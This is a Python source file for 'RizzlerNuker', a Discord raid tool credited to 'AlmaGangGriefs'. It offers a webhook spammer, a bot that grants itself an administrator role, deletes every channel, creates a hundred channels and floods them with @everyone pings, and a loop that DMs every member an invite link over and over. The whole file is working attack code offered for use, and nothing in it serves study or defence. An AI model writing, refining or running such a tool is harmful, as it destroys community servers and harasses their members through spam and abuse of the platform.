import os
import requests
import discord
from discord.ext import commands
import time
import random
import asyncio
from os import system

system("title " + "RizzlerNuker")

print("\033[92m░▒▓███████▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓█▓▒░      ░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░  \n"
      "\033[92m░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ \n"
      "\033[92m░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░    ░▒▓██▓▒░     ░▒▓██▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ \n"
      "\033[92m░▒▓███████▓▒░░▒▓█▓▒░  ░▒▓██▓▒░     ░▒▓██▓▒░  ░▒▓█▓▒░      ░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░  \n"
      "\033[92m░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓██▓▒░     ░▒▓██▓▒░    ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ \n"
      "\033[92m░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ \n"
      "\033[92m░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ \n"
      "By AlmaGangGriefs")

time.sleep(0.5)

number = 0

def massdms():
    token = input("Token: ")

    intents = discord.Intents.default()
    intents.guilds = True
    intents.guild_messages = True
    intents.guild_reactions = True
    intents.members = True

    bot = commands.Bot(command_prefix="!", intents=intents)

    @bot.event
    async def on_ready():
        print(f'Logged in as {bot.user}')
        for i in range(99999999999):
            for guild in bot.guilds:
                for member in guild.members:
                    if not member.bot:
                        try:
                            await member.send("Hi! Sorry for harrasing You, But the server has been reclaimed by the goat, https://discord.gg/VMkY94U8rv The bot's code is open source.")
                            print(f'Sent DM to: {member.name}')
                        except Exception as e:
                            print(f'Could not send DM to: {member.name}, {e}')
    bot.run(token)

def nuker():
    token = input("Token: ")

    intents = discord.Intents.default()
    intents.guilds = True
    intents.guild_messages = True
    intents.guild_reactions = True
    intents.members = True

    bot = commands.Bot(command_prefix="!", intents=intents)

    @bot.event
    async def on_ready():
        print(f'Logged in as {bot.user}')
        for guild in bot.guilds:
            await manage_guild(guild)

    async def manage_guild(guild):
        try:
            admin_role = await guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))
            print(f'Created new role: {admin_role.name}')
        except Exception as e:
            print(f'Could not create new role: {e}')

        await asyncio.gather(
            send_messages(guild),
            delete_channels(guild)
        )

    async def send_messages(guild):
        def delay(seconds):
            return asyncio.sleep(seconds)

        for member in guild.members:
            if not member.bot:
                try:
                    await member.send("Hi! Sorry for harassing you, but the server has been reclaimed by the goat, https://discord.gg/VMkY94U8rv The bot's code is open source.")
                    print(f'Sent DM to: {member.name}')
                    await delay(0.1)
                except Exception as e:
                    print(f'Could not send DM to: {member.name}, {e}')

    async def delete_channels(guild):
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f'Deleted channel: {channel.name}')
            except Exception as e:
                print(f'Could not delete channel: {channel.name}, {e}')

        for _ in range(100):
            try:
                new_channel = await guild.create_text_channel("Nuked By AlmaGangGriefs")
                print(f'Created new channel: {new_channel.name}')
                bot.loop.create_task(spam_messages(new_channel))
            except Exception as e:
                print(f'Could not create new channel: {e}')

    async def spam_messages(channel):
        while True:
            try:
                await channel.send("Nuked by AlmaGangGriefs https://discord.gg/VMkY94U8rv @everyone")
                await asyncio.sleep(0.1)
            except Exception as e:
                print(f'Could not send message: {e}')
                break

    bot.run(token)

def webhookspammer():
    url = input("Webhook: ")
    message = input("Message: ")

    data = {
        "content" : "https://discord.gg/VMkY94U8rv @everyone",
        "username" : "RizzlerNuker"
    }

    data["embeds"] = [
        {
            "description" : message,
            "title" : "NUKED BY RIZZLERNUKER",
        }
    ]

    for i in range(99999999):
        time.sleep(0.1)
        result = requests.post(url, json = data)

        try:
            result.raise_for_status()
        except requests.exceptions.HTTPError as err:
            print(err)
        else:
            print(f"Payload delivered successfully, code {result.status_code}.")

print("1: Webhook Spammer")
print("2: Server Nuker Bot")
print("3: Massdms")

choose = input("Funcion: ")

while choose != "1" and choose != "2" and choose != "3":
    choose = input("Funcion: ")

if choose == "1":
    webhookspammer()

elif choose == "2":
    nuker()

elif choose == "3":
    massdms()
